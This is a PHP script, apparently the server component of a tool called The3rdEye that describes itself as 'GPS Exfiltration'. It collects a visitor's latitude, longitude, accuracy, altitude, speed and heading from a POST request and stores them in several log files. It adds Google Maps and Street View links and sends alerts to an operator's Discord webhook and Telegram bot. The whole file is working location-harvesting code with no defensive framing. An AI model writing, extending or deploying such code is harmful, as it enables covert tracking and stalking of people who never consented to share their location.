<?php
// The3rdEye v1.0 - Enhanced GPS Exfiltration

$CONFIG_FILE = $_SERVER['HOME'] . '/.the3rdeye/config.ini';
$DISCORD_WEBHOOK = '';
$TELEGRAM_BOT_TOKEN = '';
$TELEGRAM_CHAT_ID = '';

if (file_exists($CONFIG_FILE)) {
    $config = parse_ini_file($CONFIG_FILE);
    $DISCORD_WEBHOOK = isset($config['DISCORD_WEBHOOK']) ? $config['DISCORD_WEBHOOK'] : '';
    $TELEGRAM_BOT_TOKEN = isset($config['TELEGRAM_BOT_TOKEN']) ? $config['TELEGRAM_BOT_TOKEN'] : '';
    $TELEGRAM_CHAT_ID = isset($config['TELEGRAM_CHAT_ID']) ? $config['TELEGRAM_CHAT_ID'] : '';
}

function sendToDiscord($message, $webhook) {
    if (empty($webhook)) return false;
    $payload = json_encode(['content' => "@everyone $message"]);
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

function sendToTelegram($message, $botToken, $chatId) {
    if (empty($botToken) || empty($chatId)) return false;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = ['chat_id' => $chatId, 'text' => $message];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

$date = date('dMYHis');
$latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
$accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
$altitude = isset($_POST['alt']) ? $_POST['alt'] : 'N/A';
$speed = isset($_POST['spd']) ? $_POST['spd'] : 'N/A';
$heading = isset($_POST['hdg']) ? $_POST['hdg'] : 'N/A';
$timestamp = date('Y-m-d H:i:s');

if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
    // Marker file for shell script
    file_put_contents("LocationLog.log", "[$timestamp] Location captured\n", FILE_APPEND);
    
    $gmapsLink = "https://www.google.com/maps/place/$latitude,$longitude";
    $streetViewLink = "https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=$latitude,$longitude";
    
    $data = "=== The3rdEye GeoPulse Data ===\n";
    $data .= "Timestamp: $timestamp\n";
    $data .= "Latitude: $latitude\n";
    $data .= "Longitude: $longitude\n";
    $data .= "Accuracy: $accuracy meters\n";
    $data .= "Altitude: $altitude\n";
    $data .= "Speed: $speed m/s\n";
    $data .= "Heading: $heading degrees\n";
    $data .= "Google Maps: $gmapsLink\n";
    $data .= "Street View: $streetViewLink\n";
    $data .= "===============================\n";
    
    $file = 'location_' . $date . '.txt';
    
    try {
        $fp = fopen($file, 'w');
        if ($fp) {
            fwrite($fp, $data);
            fclose($fp);
            
            // Current location for shell script
            $console_log = fopen("current_location.txt", "w");
            fwrite($console_log, $data);
            fclose($console_log);
            
            // Master location log
            $masterFile = 'saved.locations.txt';
            if (!file_exists($masterFile)) {
                touch($masterFile);
                chmod($masterFile, 0666);
            }
            $fp = fopen($masterFile, 'a');
            if ($fp) {
                fwrite($fp, "\n$data\n");
                fclose($fp);
            }
            
            // Saved locations directory
            if (!is_dir('saved_locations')) {
                mkdir('saved_locations', 0755, true);
            }
            copy($file, 'saved_locations/' . $file);
            
            // Notify webhooks
            $alertMsg = "[The3rdEye] New Location Captured!\nLat: $latitude\nLon: $longitude\nAccuracy: {$accuracy}m\nMaps: $gmapsLink";
            if (!empty($DISCORD_WEBHOOK)) sendToDiscord($alertMsg, $DISCORD_WEBHOOK);
            if (!empty($TELEGRAM_BOT_TOKEN) && !empty($TELEGRAM_CHAT_ID)) sendToTelegram($alertMsg, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);
            
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'message' => 'Location data received']);
        } else {
            throw new Exception("Could not open file for writing");
        }
    } catch (Exception $e) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
}
exit();
?>